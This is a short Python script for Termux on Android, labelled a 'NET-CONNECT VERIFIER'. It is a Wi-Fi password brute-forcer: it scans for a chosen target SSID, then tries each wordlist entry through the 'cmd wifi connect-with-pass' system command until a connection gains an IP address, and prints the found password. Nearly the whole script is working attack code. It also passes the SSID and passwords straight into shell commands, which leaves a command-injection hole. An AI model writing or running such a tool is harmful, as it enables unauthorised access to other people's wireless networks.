import os
import time
import subprocess

# Color definitions
R = '\033[91m'
G = '\033[92m'
B = '\033[94m'
W = '\033[0m'
BOLD = '\033[1m'

def show_header():
    os.system('clear')
    print(f"{B}{BOLD}" + "×"*45)
    print("      NET-CONNECT VERIFIER (TERMUX-API)")
    print("×"*45 + f"{W}")
    print(f"      {G}Author: Bayazid Habib{W}")
    print(f"      {R}System: Standalone Mode{W}\n")

def scan_network(target):
    print(f"[*] Searching for {target}...")
    try:
        # সরাসরি Termux-API এর মাধ্যমে স্ক্যান
        data = subprocess.check_output('termux-wifi-scaninfo', shell=True).decode()
        if target in data:
            print(f"{G}[+] Target found in range.{W}")
            return True
        else:
            print(f"{R}[!] Error: Target SSID not found.{W}")
            return False
    except:
        print(f"{R}[-] API Error: Check Termux-API & Location.{W}")
        return False

def run_test():
    show_header()
    
    while True:
        choice = input(f"{BOLD}Type 'start' to begin: {W}").lower()
        if choice == "start":
            break

    target_ssid = input("[+] Target SSID: ")
    if not scan_network(target_ssid):
        return

    path = input("[+] Wordlist Path: ")
    if not os.path.exists(path):
        print(f"{R}[-] File path invalid.{W}")
        return

    try:
        with open(path, 'r') as f:
            all_pass = f.readlines()
            print(f"\n{G}[*] Testing access for: {target_ssid}{W}")
            
            for i, p in enumerate(all_pass, 1):
                pwd = p.strip()
                if len(pwd) < 8: continue
                
                print(f"[*] Trying [{i}/{len(all_pass)}]: {pwd}", end='\r')
                
                # সরাসরি সিস্টেম কমান্ড ব্যবহার
                os.system(f'cmd wifi connect-with-pass "{target_ssid}" "{pwd}"')
                time.sleep(4)
                
                try:
                    res = subprocess.check_output('termux-wifi-connectioninfo', shell=True).decode()
                    if target_ssid in res and "ip_address" in res:
                        print(f"\n\n{G}{BOLD}[+] ACCESS GRANTED! Password: {pwd}{W}")
                        return
                except:
                    pass
                
    except KeyboardInterrupt:
        print(f"\n{R}[!] Stopped by user.{W}")

if __name__ == "__main__":
    run_test()
